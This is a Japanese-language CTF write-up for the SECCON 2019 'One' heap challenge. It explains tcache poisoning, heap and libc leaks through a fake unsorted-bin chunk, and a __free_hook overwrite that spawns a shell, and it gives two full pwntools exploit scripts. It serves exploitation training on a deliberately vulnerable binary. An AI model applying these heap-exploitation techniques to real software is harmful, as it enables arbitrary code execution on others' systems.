---
tags: pwn
---

# SECCON CTF 2019 Quals - One

これまでに解いた問題: https://hackmd.io/@Xornet/BkemeSAhU

## 公式リポジトリ

<https://github.com/SECCON/SECCON2019_online_CTF>

## Writeup

### Outline

Create+Edit, delete, showが出来るいつものHeap問題、但しchecksec系の機構は全部有効。
加えて固定サイズのmallocなのでtcache poisoningを下手にやるとtcacheのカウンタが負になってしまいこれ以上tcacheを利用できなくなる。
更に管理できるポインタも1つしか無いの次に確保するポインタを上手くコントロールする必要がある。
Double Free直後のshowでHeap領域のアドレスが判明する。そして特にtcacheに在庫が無ければ(ヌルポインタにすれば)その下からmallocが行われるので以降のmallocで確保される領域のアドレスは判明する。
ここにfastbinに入らない程度に大きい偽装チャンクを作り、Double Freeで次に確保するチャンクをそこへと設定し7回freeさせてそのサイズのtcacheを満杯にさせる。
すると次のfreeでUnsorted Binに送り込まれるのでUAFでlibc leakが出来、あとは`__free_hook`を書き換えてシェルを起動する。

### Binary

```
$ checksec one
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

フル装備、Unsorted Bin経由のlibc leakと`__free_hook`の書き換えということは予想が付く。
バイナリの処理自体に特筆すべき点は無い(のでGhidraのデコンパイル結果は省略する)。いつもどおり`create+edit`, `show`, `delete`が出来て対象のポインタはグローバル変数で管理している。

### tcacheの使用回数

さてこの問題が今まで解いてきた問題と違って面倒くさいのはサイズ固定(0x40)のmallocということである。ということは普通にしていれば0x50(`malloc(0x40)`した際のチャンクサイズは0x50になる)のチャンクを管理するtcacheしか使われない。
ここで問題になるのが今までDouble Freeを利用したアドレス書き換えで今までやってきた動きをするとtcacheのカウントが負数になってしまう。
tcacheはそこに幾つチャンクが繋がっているかを数えるカウンタがある。次の例でこのカウンタがどうなるかを見てみる

1. `malloc(0x40)` -> `free(p)` -> `free(p)`
```
~~ tcache(0x50), count: 2 ~~
 p -> p -> ...
```
いつものようにDouble Freeをする。最初のmallocではtcacheから取っている訳ではないので特にカウンタに影響は無い。その後2回のfreeをするのでサイズ0x50のtcacheは2つチャンクが繋がれたと判定しカウンタが2増える

2. `malloc(0x40)` -> `edit(x)`
```
~~ tcache(0x50), count: 1 ~~
 p -> x
```
mallocして値を書き込む。この際、tcacheから領域を確保したのでcountは1減る。

3. `malloc(0x40)`
```
~~ tcache(0x50), count: 0 ~~
 x
```
mallocする。カウンタは0

4. `malloc(0x40)` -> `edit(y)`
```
~~ tcache(0x50), count: -1(?) ~~
```
mallocして編集する、`*x = y`になったのは良いがカウンタがマイナスになる。おそらくmalloc時にはtcacheのトップにチャンクが繋がっているかだけを見ておりカウンタが0でも繋がっていればここから確保される、free時はカウンタを見てtcacheに繋ぐかどうかを決めていると思われる。
カウンタが-1になると非負整数で管理している都合上、負の方向へのオーバーフローを起こして非常に大きな値になってしまう。すると7つまでしか管理できないtcacheとしてはこれ以上入らない扱いとなり、以後サイズが0x50のチャンクをfreeしてもtcacheに繋がれない。したがって同じサイズを使って連続したtcache poisoningをするのには少し工夫が必要になる。

といってもそんな難しいことはなく、2回より大きい回数freeしてカウンタが0以上であることを保てば良い。
下記Exploit中で序盤に6回もfreeしているのはそれが理由である(流石に過剰だが念にはね念を)。

実はこの問題のWriteupを読んでいて気になった最初のポイントがここで、なんでDouble Freeするだけなのに3回以上freeしているんだろうと思っていた。

### Heap領域のリーク

この問題、show機能はあるのだが、PIEが有効なのでtcache poisoningで任意アドレスを書き換えようとしても最初は何も出来ない。よってアドレスをリークさせたいのだがmallocできるサイズが0x40で固定なのでUnsorted Binに送ることも出来ない、マジかよ。
Double FreeとUAFが出来るのでtcacheを`p -> p -> ...`のように巡回させてshowすればひとまずHeap領域のアドレスは判明する。
これの上手い利用方法だが、tcacheや各種binが空なら、次にmallocされる領域がおそらくこの真下であることからこれ以降確保される領域のアドレスを特定することが出来る。よってこの辺りに偽チャンクをアドレスが分かっている状態で作ることが出来る。

### tcacheを空にする

と、その前にサイズ0x50のtcacheをヌルポインタに繋いでtcacheに何も無い状態にする。Heap leakの際にDouble FreeとUAF(read)を行っているので次のようなtcacheになっている。

```
~~ tcache ~~
 p -> p -> ...
```
ここでcreate+edit(0)を行うと次のようになる

```
~~ tcache ~~
p -> 0
```

更にここでcreateを行えばtcacheが空になる。こうして次に`malloc(0x40)`が呼ばれてもサイズ0x50のtcacheからチャンクが確保されることは無い

### 偽装チャンクを作る

というわけで偽装チャンクを作る。今回作るのはサイズ0x90のチャンクである。もちろんUnsorted Binに送り込みたいので下と更にその下にもチャンクを作って無事にUnsorted Binへ繋がるようにする。
ちなみに0x90にしたのはfastbinに送り込まれないこととPREV_INUSEが立ったチャンクを作る際に通常のmallocで生成されるチャンクが利用できて簡単だからである。
heap leak以降のmalloc, freeはtcacheを介していたのでおそらくmain_arenaのtopは変わっていない、したがってリークしたアドレスに対応するチャンクの真下からメモリ確保が行われる。ここで何度かmallocを行った様子が次のようになる(1行で0x10バイトであり、パイプ(`|`)で区切っているのは0x8バイト単位で右側が高位である、またチャンクの区切りを`-`列で表している)。

```
leak - 0x10  -> |        |  0x51  |
-----------------------------------
leak         -> |        |        | # leakしたチャンク
leak + 0x10  -> |        |        |
leak + 0x20  -> |        |        |
leak + 0x30  -> |        |        |
leak + 0x40  -> |        |  0x51  | 
-----------------------------------
leak + 0x50  -> |        |        | # 次のmallocで確保されたチャンク
leak + 0x60  -> |        |        |
leak + 0x70  -> |        |        |
leak + 0x80  -> |        |        |
leak + 0x90  -> |        |  0x51  |
-----------------------------------
leak + 0xa0  -> |        |        | # 2つ目
leak + 0xb0  -> |        |        |
leak + 0xc0  -> |        |        |
leak + 0xd0  -> |        |        |
leak + 0xe0  -> |        |  0x51  |
-----------------------------------
leak + 0xf0  -> |        |        | # 3つ目
leak + 0x100 -> |        |        |
leak + 0x110 -> |        |        |
leak + 0x120 -> |        |        |
leak + 0x130 -> |        |  0x51  |
-----------------------------------
leak + 0x140 -> |        |        | # 4つ目
leak + 0x150 -> |        |        |
leak + 0x160 -> |        |        |
leak + 0x170 -> |        |        |
leak + 0x180 -> |        |  0x51  |
-----------------------------------
leak + 0x190 -> |        |        | # 5つ目
...
```
これを見るとleakの値が既に分かっており、malloc時に値を書き込むのでどこに何を書き込まれたかがわかる。0x90のチャンクを作るにはサイズヘッダ部分と合わせて`0x100`バイトが最低でも必要である。となると真っ先に候補に上がるのが`leak + 0x60 ~ leak + 0xef`の部分である(サイズヘッダは`leak + 0x50 ~ leak + 0x4f`)。
また、ここに上手くチャンクを作れた場合、2回mallocすると真下に勝手にPREV_INUSEフラグが立った領域が確保される、嬉しい。

というわけで次のようなメモリになるようにcreate + editを行う。

```
leak - 0x10  -> |        |  0x51  |
/////////////////////////////////// # mallocによるチャンク境界
leak         -> |        |        | # leakしたチャンク
leak + 0x10  -> |        |        |
leak + 0x20  -> |        |        |
leak + 0x30  -> |        |        |
leak + 0x40  -> |        |  0x51  | 
/////////////////////////////////// # mallocによるチャンク境界
leak + 0x50  -> |        |  0x91  | # サイズヘッダ
-----------------------------------
leak + 0x60  -> |        |        | # 偽装チャンク開始
leak + 0x70  -> |        |        |
leak + 0x80  -> |        |        |
leak + 0x90  -> |        |  0x51  |
/////////////////////////////////// # mallocによるチャンク境界
leak + 0xa0  -> |        |        | 
leak + 0xb0  -> |        |        |
leak + 0xc0  -> |        |        |
leak + 0xd0  -> |        |        |
leak + 0xe0  -> |        |  0x51  | # 偽装チャンク終端
-----------------------------------
/////////////////////////////////// # mallocによるチャンク境界(偽装チャンク境界と一致)
```
Exploitコード中では面倒なのでサイズヘッダ部分を連打しているだけだがサイズヘッダが無事に出来てしまえば特に問題はない。

### tcacheを満杯にさせる

無事にチャンクが出来たのでここをfreeしたい、というわけで[HSCTF 6 - Aria Writer v3](/cWZap97rRoySNQIVhKluXw)同様にtcache poisoningで次に確保される領域がここを指すようにする(`p -> p -> ...`から`p -> leak + 0x60`にして2回mallocする)。そしてfreeすれば無事にUnsorted Binに格納され...ない。これは当然でtcacheはサイズ0x420未満のチャンクなら該当サイズのtcacheが空いている限り放り込む。
tcacheに繋ぐことが出来るチャンクは7つまでであり、この判定はカウンタによって行われる。ということは実際に繋がっているかどうかはともかく7回freeをしてカウンタを増やしてしまえば以後tcacheには繋がれなくなる。
そして8回目のfree時にもうtcacheには入らない上にfastbinに入るサイズでも無いのでUnsorted Bin送りになる、長かった。

### いつもの

というわけでこれまでのWriteup同様`main_arena.top`に対応するアドレスを読んで、オフセットを引いてlibc leakし、後はいつものtcache poisoningで`__free_hook`を`system`に書き換えてシェルを起動する。

## Code

```python
from pwn import process, ELF, p64, u64


def _select(s, sel, c=b"> "):
    s.recvuntil(c)
    s.sendline(sel)


def add(s, data=b"junk"):
    _select(s, b"1")
    s.recvuntil(b"Input memo > ")
    s.sendline(data)


def show(s):
    _select(s, b"2")
    return s.recvline().rstrip()


def delete(s):
    _select(s, b"3")


if __name__ == '__main__':
    """
        Arch:     amd64-64-little
        RELRO:    Full RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      PIE enabled
    """
    s = process("./one", env={"LD_PRELOAD": "./libc-2.27.so"})

    elf = ELF("./one")
    libc = ELF("./libc-2.27.so")

    arena_libc = 0x3ebc40
    free_hook_libc = libc.symbols["__free_hook"]
    system_libc = libc.symbols["system"]

    # heap leak
    add(s)

    for _ in range(6):
        delete(s)
    heap_addr = u64(show(s).ljust(8, b"\x00"))
    print(hex(heap_addr))

    add(s, p64(0))  # tcache(0x50): A -> null
    add(s)  # tcache(0x50) is empty

    # making fake chunk
    fake_chunk = heap_addr + 0x60

    for _ in range(4):
        add(s, (p64(0) + p64(0x91)) * 3)

    delete(s)
    delete(s)
    add(s, p64(fake_chunk))
    add(s)
    add(s)  # p -> faka_chunk

    for _ in range(8):
        delete(s)  # fake_chunk is send to unsorted bin

    libc_base = u64(show(s).ljust(8, b"\x00")) - arena_libc - 0x60
    print(hex(libc_base))

    # write to __free_hook
    add(s)
    delete(s)
    delete(s)
    add(s, p64(libc_base + free_hook_libc))
    add(s)
    add(s, p64(libc_base + system_libc))

    add(s, "/bin/sh\x00")
    delete(s)

    s.interactive()

```

## Flag

ローカルでシェル取っただけなので無いです

## 参考Writeup

* [faithさんのwriteup](https://faraz.faith/2019-10-20-secconctf-2019-one/): 1番参考にしたwriteup、7回のfreeでtcacheを満杯にさせてからUnsorted Binに送っている
* [smallkirbyさんのwriteup](https://smallkirby.hatenablog.com/entry/2019/10/20/152309#3-One): デカいチャンクをUnsorted Binに送る

## 感想

長かった、チャレンジ開始2日目ぐらいのお題にしようと思ったが、Writeupを読んでもfreeを連発していたり、呼吸をするように偽装チャンクを生成したりしていて意味がわからず1時間を無にして泣きそうになっていた。問題をこなしていくにつれて読める範囲が広がっていきとうとう解くことが出来た、嬉しい。
実は0x420バイト以上の大きい偽装チャンクをfreeした際のUnsorted Bin経由のlibc leakを最初試したが、libc leakまで出来たところで最後の`__free_hook`書き換えのtcache poisoningに失敗したので(これを利用した攻撃は可能で私のコードかチャンクの構成法が悪い)その原因を暇があったら探りたい

## 追記

チャンクのサイズを上手く設定してtcacheを空にしてからチャンク生成をしたらクソデカいサイズのチャンクを一発でUnsorted Binに送る方法でもなんか上手く通りました

```python
from pwn import process, ELF, p64, u64


def _select(s, sel, c=b"> "):
    s.recvuntil(c)
    s.sendline(sel)


def add(s, data=b"junk"):
    _select(s, b"1")
    s.recvuntil(b"Input memo > ")
    s.sendline(data)


def show(s):
    _select(s, b"2")
    return s.recvline().rstrip()


def delete(s):
    _select(s, b"3")


if __name__ == '__main__':
    """
        Arch:     amd64-64-little
        RELRO:    Full RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      PIE enabled
    """
    s = process("./one", env={"LD_PRELOAD": "./libc-2.27.so"})

    elf = ELF("./one")
    libc = ELF("./libc-2.27.so")

    arena_libc = 0x3ebc40
    free_hook_libc = libc.symbols["__free_hook"]
    system_libc = libc.symbols["system"]

    # heap leak
    add(s, p64(0) + p64(0x91))

    for _ in range(6):
        delete(s)
    heap_addr = u64(show(s).ljust(8, b"\x00"))
    print(hex(heap_addr))

    add(s, p64(0))  # tcache(0x50): A -> null
    add(s)  # tcache(0x50) is empty

    # making fake chunk
    fake_chunk = heap_addr + 0x60

    # calculating size of large chunk
    min_size = 0x420
    c = 0
    header_size = 0x40
    sub_chunk_size = 0x50
    large_chunk_size = 0
    while large_chunk_size < min_size:
        large_chunk_size = c * sub_chunk_size + header_size
        c += 1

    print("[+] needed count of free:", c)
    print("[+] large chunk size:", large_chunk_size)

    for _ in range(c + 2):
        add(s, (p64(0) + p64(large_chunk_size + 1)) * 3)

    delete(s)
    delete(s)
    add(s, p64(fake_chunk))
    add(s)
    add(s)  # p -> faka_chunk
    delete(s)  # fake_chunk is send to unsorted bin

    libc_base = u64(show(s).ljust(8, b"\x00")) - arena_libc - 0x60
    print(hex(libc_base))

    # write to __free_hook
    add(s)
    delete(s)
    delete(s)
    add(s, p64(libc_base + free_hook_libc))
    add(s)
    add(s, p64(libc_base + system_libc))

    add(s, "/bin/sh\x00")
    delete(s)

    s.interactive()

```